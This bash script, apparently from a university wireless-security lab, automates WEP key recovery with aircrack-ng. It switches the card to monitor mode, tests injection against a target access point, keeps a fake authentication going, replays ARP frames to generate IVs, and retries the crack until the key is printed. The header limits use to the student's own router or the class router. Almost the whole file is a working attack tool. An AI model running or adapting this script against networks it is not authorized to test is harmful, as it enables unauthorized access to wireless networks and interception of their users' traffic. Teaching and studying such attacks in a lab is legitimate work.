#!/usr/bin/env bash
#
# wep-crack.sh — authorized WEP key-recovery automation (Lab #10, CS VIII)
#
# Drives the standard aircrack-ng flow against a WEP access point you are
# authorized to test (your own GL-AR300M16, or the class router during the
# evaluation window). WEP falls to a statistical/PTW attack on captured IVs —
# NO dictionary is used, which is the whole point of the lab.
#
#   active  mode: monitor -> injection test against the target -> fake-auth -> ARP
#                 replay. Needs a card that injects reliably against the target.
#                 This is what recovers the key fast.
#   passive mode: monitor + capture only. Works on any card that can monitor
#                 (e.g. the Intel AC8260). Good for practice and for the analysis
#                 half of the writeup.
#
# Usage:
#   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N] [-x pps]
#   sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N] [-x pps]
#
# Example:
#   sudo ./scripts/wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
#
# -M takes a monitor interface that is already up, such as one that airodump.sh or
# competition-deauth.sh -i started. This run neither starts nor stops it and does not change its
# channel, so the card must already be on -c. The monitor stays up when this run exits, and the run
# that started it stops it. Give -i or -M, not both.
#
# -x <pps> caps the ARP replay at that many packets a second (aireplay-ng -x). Unset, the replay runs
# uncapped. The progress lines count the Wi-Fi card's firmware restarts (FW resets) since this run started.
#
# Monitor mode, the capture and the WiFi recovery come from wifi-lib.sh, the same
# code that airodump.sh and injection-test.sh use. Cleanup runs on exit, including
# Ctrl-C. If WiFi still stays dark, run ./scripts/wifi-recover.sh -i <iface>.
# On exit it prints what the capture holds, minute by minute, and saves that as <prefix>-01-health.txt.
#
set -u

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
LAB_DIR=$(cd "$SCRIPT_DIR/.." && pwd)
LOGDIR="$LAB_DIR/logs"
# shellcheck source=wifi-lib.sh
source "$SCRIPT_DIR/wifi-lib.sh"

# ---- defaults -------------------------------------------------------------
IFACE=""
MONIFACE=""              # -M: a monitor interface that is already up. This run uses it as it is
BSSID=""
CHANNEL=""
ESSID=""
MODE="active"
PREFIX="wepcap"
IV_TARGET=10000          # aircrack is retried each time #Data grows by this much (-t)
MIN_IVS=40000            # first attempt here: PTW breaks half of 104-bit keys under 40,000 IVs
RETRY_SECS=3             # seconds between progress lines (airodump rewrites the capture every second)
STALL_SECS=60            # warn when no ARP ACK arrives for this long (active mode)
MAX_FAKEAUTH_FAILS=3     # fake-auth relaunches in a row that never associate before the run stops
RATE_CAP=""              # -x: ARP replay packets per second. Empty = uncapped

while getopts ":i:M:b:c:e:m:o:t:x:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    M) MONIFACE="$OPTARG" ;;
    b) BSSID="$OPTARG" ;;
    c) CHANNEL="$OPTARG" ;;
    e) ESSID="$OPTARG" ;;
    m) MODE="$OPTARG" ;;
    o) PREFIX="$OPTARG" ;;
    t) IV_TARGET="$OPTARG" ;;
    x) RATE_CAP="$OPTARG" ;;
    h) usage 0 ;;
    *) usage ;;
  esac
done

# ---- preflight ------------------------------------------------------------
wifi_preflight airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli systemctl tshark gawk
[[ -n "$IFACE$MONIFACE" && -n "$BSSID" && -n "$CHANNEL" ]] || usage
[[ -z "$IFACE" || -z "$MONIFACE" ]] || die "Give -i or -M, not both: -i starts monitor mode here, -M uses one that is up."
[[ "$MODE" == "active" || "$MODE" == "passive" ]] || die "-m must be active|passive. For a monitor that is already up, use -M."
[[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || die "-t must be a positive number of IVs"
[[ -z "$RATE_CAP" || "$RATE_CAP" =~ ^[1-9][0-9]*$ ]] || die "-x must be a positive number of packets per second"
if [[ -n "$MONIFACE" ]]; then
  [[ "$(iface_type "$MONIFACE")" == monitor ]] ||
    die "$MONIFACE is not in monitor mode, so nothing was changed. Check: iw dev. Or give -i to start monitor mode here."
else
  wifi_require_iface "$IFACE"
  # This run stops the monitor on exit, so it refuses one that another run may still use.
  [[ "$(iface_type "$IFACE")" != monitor ]] ||
    die "$IFACE is already in monitor mode, so nothing was changed. If another run uses it, give it with -M. Otherwise restore WiFi first: ./scripts/wifi-recover.sh -i $IFACE"
fi

# ---- output location ------------------------------------------------------
# Each run gets its own folder under logs/ (gitignored), so its capture, key and attack output
# stay together and an earlier run is never overwritten.
RUNDIR=$(new_run_dir "$LOGDIR" "$PREFIX") || die "Could not create a run folder in $LOGDIR"
AIRMON_LOG="$RUNDIR/airmon.log"
: > "$AIRMON_LOG"
OUT="${RUNDIR}/${PREFIX}"
KEYFILE="${OUT}.key"
echo "[*] Run folder: $RUNDIR"
RUN_START=$(date +%s)  # firmware restarts are counted in the kernel log from here

# ---- start capture --------------------------------------------------------
wifi_guard "${IFACE:-$MONIFACE}"
if [[ -n "$MONIFACE" ]]; then
  # Another run owns this monitor. Set before anything else can exit, so the exit leaves it up.
  WIFI_SHARED_MONITOR=1
  MON=$MONIFACE
  echo "[*] Using $MON as it is, already in monitor mode. This run does not start, stop or re-channel it."
  # Checked before the capture starts: its airodump-ng -c would move the other run's card if the channel were wrong.
  got_channel=$(iface_channel "$MON")
  [[ "$got_channel" == "$CHANNEL" ]] || die "$MON reports channel '${got_channel:-none}', not $CHANNEL. Nothing was changed."
  echo "[*] $MON reports channel $CHANNEL."
else
  wifi_monitor_start "$IFACE"
  wifi_set_channel "$CHANNEL"
fi

echo "[*] Starting capture -> ${OUT}-01.cap (BSSID $BSSID, ch $CHANNEL)"
airodump_start "$OUT" "$CHANNEL" "$BSSID" bg
REPORT_CAP="${OUT}-01.cap"
REPORT_BSSID="$BSSID"
sleep 4

# ---- active injection -----------------------------------------------------
if [[ "$MODE" == "active" ]]; then
  MYMAC=$(iw dev "$MON" info 2>/dev/null | awk '/addr/{print $2; exit}')
  echo "[*] Verifying injection against the target $BSSID..."
  if inject_test "$MON" "${OUT}-injection.txt" "$BSSID" >/dev/null; then
    echo "[*] Target answered $(ap_ratio "${OUT}-injection.txt" "$BSSID") probes."
  else
    echo "[!] Injection test did NOT pass: $BSSID did not answer on $IFACE."
    echo "    Replies per AP are in ${OUT}-injection.txt. Falling back to PASSIVE capture."
    echo "    Active mode needs a card that injects against this AP."
    MODE="passive"
  fi
fi

# aireplay-ng re-authenticates by itself after a deauth aimed at this card (a 3 s pause). It
# ignores broadcast deauths. A disassoc re-authenticates at once, so its "3 seconds" is no real pause.
# The process exits only on errors, such as the monitor going down. check_fakeauth relaunches it then.
fakeauth_restarts=0
fakeauth_fails=0
# keep re-authenticating every 10s so we stay associated. --ignore-negative-one: aireplay-ng
# cannot read the monitor channel that wifi_set_channel set, and without the flag it exits.
# Run from the run folder, so the replay_arp-*.cap it writes lands there.
# stdbuf keeps the logs current. >> so a relaunch appends instead of truncating.
start_fakeauth() {
  fakeauth_base=$(grep -ac 'Authentication successful' "${OUT}-fakeauth.txt" 2>/dev/null)
  ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --fakeauth 10 -o 1 -q 10 \
      -a "$BSSID" -h "$MYMAC" ${ESSID:+-e "$ESSID"} "$MON" ) >>"${OUT}-fakeauth.txt" 2>&1 &
  fakeauth_pid=$!
  track_pid "$fakeauth_pid"
}

# A relaunch that associates resets the count. MAX_FAKEAUTH_FAILS in a row without an association
# stops the run, so an AP that never answers does not leave it looping.
check_fakeauth() {
  kill -0 "$fakeauth_pid" 2>/dev/null && return 0
  local assoc
  assoc=$(grep -ac 'Authentication successful' "${OUT}-fakeauth.txt" 2>/dev/null)
  if (( ${assoc:-0} > ${fakeauth_base:-0} )); then
    fakeauth_fails=0
  else
    fakeauth_fails=$((fakeauth_fails + 1))
  fi
  (( fakeauth_fails < MAX_FAKEAUTH_FAILS )) ||
    die "fake auth stopped $fakeauth_fails times in a row without associating; see ${OUT}-fakeauth.txt"
  fakeauth_restarts=$((fakeauth_restarts + 1))
  echo "    [!] fake auth stopped, relaunching (#${fakeauth_restarts}; see ${OUT}-fakeauth.txt)"
  start_fakeauth
}

if [[ "$MODE" == "active" ]]; then
  echo "[*] Associating with AP (fake auth)..."
  start_fakeauth
  echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
  [[ -n "$RATE_CAP" ]] && echo "[*] ARP replay capped at ${RATE_CAP} packets per second (-x)."
  ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
    >"${OUT}-arpreplay.txt" 2>&1 &
  arp_pid=$!
  track_pid "$arp_pid"
else
  echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
fi

# ---- crack loop -----------------------------------------------------------
echo "[*] IVs: captured IVs. IV/s: new IVs per second. ARP req: ARP requests captured for replay."
echo "    ACK: frames the AP acknowledged. TX: frames our card sent."
echo "[*] Progress every ${RETRY_SECS}s. aircrack-ng tries the key at ${MIN_IVS} IVs, then every ${IV_TARGET} more."
echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
# #IV on the target AP's row of the airodump-ng CSV (0 until the first write).
ap_ivs() {
  local n
  n=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "${OUT}-01.csv" 2>/dev/null)
  echo "${n:-0}"
}

# ACKs from the last ARP replay status line; 0 until the first.
arp_acks() {
  local n
  n=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'ARP requests and' | tail -n 1 |
    sed -nE 's/.*ARP requests and ([0-9]+) ACKs.*/\1/p')
  echo "${n:-0}"
}

# Firmware restarts of the Wi-Fi card since this run started. The kernel logs one "Microcode SW error" per restart.
fw_resets() {
  journalctl -k --no-pager --since "@$RUN_START" 2>/dev/null | grep -c "Microcode SW error"
}

# Warns once when no ARP ACK arrives for STALL_SECS (IVs can come from other clients).
check_stall() {
  local acks=$1 now_s=$2
  if (( acks != prev_acks )); then
    if (( stall_warned )); then
      echo "    [*] ARP ACKs moving again after $((now_s - last_moved)) s."
      stall_warned=0
    fi
    last_moved=$now_s
  elif (( stall_warned == 0 && now_s - last_moved >= STALL_SECS )); then
    echo "    [!] no new ARP ACKs for $((now_s - last_moved)) s. The AP may have dropped the card," \
      "or no ARP request has come in yet. Ctrl-C and use -m passive if it does not recover."
    stall_warned=1
  fi
}

# Prints the recovered key as ASCII (when every byte is printable) and as colon-separated hex.
# aircrack-ng writes the key file as hex.
show_key() {
  local hex sep ascii="" byte i
  hex=$(tr -d ': \r\n' < "$KEYFILE" | tr 'a-f' 'A-F')
  for ((i = 0; i < ${#hex}; i += 2)); do
    printf -v byte "\\x${hex:i:2}"
    ascii+=$byte
  done
  sep=$(sed 's/../&:/g; s/:$//' <<< "$hex")
  echo "============================================================"
  echo " KEY RECOVERED"
  if [[ "$ascii" =~ ^[[:print:]]+$ ]]; then
    printf ' %-10s%s\n' "ASCII:" "$ascii"
  fi
  printf ' %-10s%s\n' "Hex:" "$sep"
  printf ' %-10s%s\n' "Saved to:" "$KEYFILE"
  printf ' %-10s%s\n' "Capture:" "${OUT}-01.cap"
  if (( fakeauth_restarts > 0 )); then
    printf ' %-10s%s\n' "Restarts:" "fake auth relaunched ${fakeauth_restarts} time(s)"
  fi
  echo "============================================================"
}
last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
try_pid=""               # the aircrack-ng attempt running in the background, if any
prev_iv=$(ap_ivs)        # #Data at the last progress line, for the rate
prev_time=$(date +%s.%N) # when that line was printed
prev_acks=$(arp_acks)
last_moved=$(date +%s)   # when ARP ACKs last moved, for the stall warning
stall_warned=0
while true; do
  sleep "$RETRY_SECS"
  # A card reset or a stopped attack would otherwise leave the count frozen, so stop with the reason.
  iw dev "$MON" info >/dev/null 2>&1 || die "$MON is gone: the card reset, or whatever started the monitor stopped it (see: sudo dmesg | tail -n 30)."
  if [[ "$MODE" == "active" ]]; then
    kill -0 "$arp_pid" 2>/dev/null || die "ARP replay stopped; see ${OUT}-arpreplay.txt"
    check_fakeauth
  fi
  ivs=$(ap_ivs)
  acks=$(arp_acks)
  # Latest ARP replay counters, from the last status line aireplay-ng printed.
  replay=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'ARP requests and' | tail -n 1 |
    sed -E 's/.*got ([0-9]+) ARP requests and ([0-9]+) ACKs\), sent ([0-9]+) packets.*/ARP req \1, ACK \2, TX \3/')
  # The rate is per real second: a slow aircrack try can make the loop take longer than RETRY_SECS.
  now=$(date +%s.%N)
  rate=$(awk -v d="$((ivs - prev_iv))" -v a="$prev_time" -v b="$now" 'BEGIN { t = b - a; printf "%+d", (t > 0 ? d / t : 0) }')
  echo "    $(date +%H:%M:%S)  IVs ${ivs} (${rate} IV/s)  ${replay}  FW resets $(fw_resets)"
  if [[ "$MODE" == "active" ]]; then
    check_stall "$acks" "$(date +%s)"
  fi
  prev_iv=$ivs
  prev_acks=$acks
  prev_time=$now
  # A finished try found the key only if the key file exists: aircrack-ng writes it on success.
  if [[ -n "$try_pid" ]] && ! kill -0 "$try_pid" 2>/dev/null; then
    try_pid=""
    if [[ -s "$KEYFILE" ]]; then
      echo
      show_key
      exit 0
    fi
  fi
  # One try at a time, in the background, so the progress lines and the checks above keep running
  # while it works. The first try waits for MIN_IVS, then each try waits for IV_TARGET more IVs.
  if [[ -z "$try_pid" ]] && (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
    last_iv=$ivs
    echo "    [*] trying the key at ${ivs} IVs (up to 10 s, in the background)..."
    # -n 128: a 13-character (104-bit) WEP key. -b: the capture can hold other networks.
    # timeout: aircrack-ng keeps searching when the key is missing, so a failed try stops at 10 s (a found
    # key takes under a second). -k 5: KILL if TERM is ignored. The next try waits for IV_TARGET more IVs.
    timeout -k 5 10 aircrack-ng -q -n 128 -b "$BSSID" -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 &
    try_pid=$!
    track_pid "$try_pid"
  fi
done
